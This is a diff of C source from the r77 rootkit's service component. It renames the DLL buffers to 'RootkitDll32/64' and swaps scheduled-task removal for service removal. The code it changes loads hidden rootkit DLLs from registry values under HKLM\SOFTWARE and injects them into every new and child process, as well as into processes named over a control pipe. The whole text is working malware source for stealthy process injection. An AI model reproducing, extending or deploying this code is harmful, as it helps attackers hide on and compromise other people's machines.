@@ -50,14 +50,14 @@ BOOL InitializeService()
 	// Get both r77 DLL's.
 	HKEY key;
 	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE", 0, KEY_QUERY_VALUE, &key) != ERROR_SUCCESS ||
-		RegQueryValueExW(key, HIDE_PREFIX L"dll32", NULL, NULL, NULL, &Dll32Size) != ERROR_SUCCESS ||
-		RegQueryValueExW(key, HIDE_PREFIX L"dll64", NULL, NULL, NULL, &Dll64Size) != ERROR_SUCCESS) return FALSE;
+		RegQueryValueExW(key, HIDE_PREFIX L"dll32", NULL, NULL, NULL, &RootkitDll32Size) != ERROR_SUCCESS ||
+		RegQueryValueExW(key, HIDE_PREFIX L"dll64", NULL, NULL, NULL, &RootkitDll64Size) != ERROR_SUCCESS) return FALSE;
 
-	Dll32 = NEW_ARRAY(BYTE, Dll32Size);
-	Dll64 = NEW_ARRAY(BYTE, Dll64Size);
+	RootkitDll32 = NEW_ARRAY(BYTE, RootkitDll32Size);
+	RootkitDll64 = NEW_ARRAY(BYTE, RootkitDll64Size);
 
-	if (RegQueryValueExW(key, HIDE_PREFIX L"dll32", NULL, NULL, Dll32, &Dll32Size) != ERROR_SUCCESS ||
-		RegQueryValueExW(key, HIDE_PREFIX L"dll64", NULL, NULL, Dll64, &Dll64Size) != ERROR_SUCCESS) return FALSE;
+	if (RegQueryValueExW(key, HIDE_PREFIX L"dll32", NULL, NULL, RootkitDll32, &RootkitDll32Size) != ERROR_SUCCESS ||
+		RegQueryValueExW(key, HIDE_PREFIX L"dll64", NULL, NULL, RootkitDll64, &RootkitDll64Size) != ERROR_SUCCESS) return FALSE;
 
 	RegCloseKey(key);
 
@@ -132,8 +132,8 @@ VOID ChildProcessCallback(DWORD processId)
 
 	if (!IsInjectionPaused)
 	{
-		InjectDll(processId, Dll32, Dll32Size);
-		InjectDll(processId, Dll64, Dll64Size);
+		InjectDll(processId, RootkitDll32, RootkitDll32Size);
+		InjectDll(processId, RootkitDll64, RootkitDll64Size);
 	}
 }
 VOID NewProcessCallback(DWORD processId)
@@ -142,8 +142,8 @@ VOID NewProcessCallback(DWORD processId)
 
 	if (!IsInjectionPaused)
 	{
-		InjectDll(processId, Dll32, Dll32Size);
-		InjectDll(processId, Dll64, Dll64Size);
+		InjectDll(processId, RootkitDll32, RootkitDll32Size);
+		InjectDll(processId, RootkitDll64, RootkitDll64Size);
 	}
 }
 VOID ControlCallback(DWORD controlCode, HANDLE pipe)
@@ -167,8 +167,7 @@ VOID ControlCallback(DWORD controlCode, HANDLE pipe)
 				RegDeleteValueW(key, HIDE_PREFIX L"dll64");
 			}
 
-			DeleteScheduledTask(R77_SERVICE_NAME32);
-			DeleteScheduledTask(R77_SERVICE_NAME64);
+			DeleteWindowsService(R77_SERVICE_NAME);
 			DetachAllInjectedProcesses();
 			UninstallR77Config();
 			UninitializeService();
@@ -190,8 +189,8 @@ VOID ControlCallback(DWORD controlCode, HANDLE pipe)
 			DWORD bytesRead;
 			if (ReadFile(pipe, &processId, sizeof(DWORD), &bytesRead, NULL) && bytesRead == sizeof(DWORD))
 			{
-				InjectDll(processId, Dll32, Dll32Size);
-				InjectDll(processId, Dll64, Dll64Size);
+				InjectDll(processId, RootkitDll32, RootkitDll32Size);
+				InjectDll(processId, RootkitDll64, RootkitDll64Size);
 			}
 
 			break;
@@ -206,8 +205,8 @@ VOID ControlCallback(DWORD controlCode, HANDLE pipe)
 
 				for (DWORD i = 0; i < processCount; i++)
 				{
-					InjectDll(processes[i], Dll32, Dll32Size);
-					InjectDll(processes[i], Dll64, Dll64Size);
+					InjectDll(processes[i], RootkitDll32, RootkitDll32Size);
+					InjectDll(processes[i], RootkitDll64, RootkitDll64Size);
 				}
 			}
 			break;
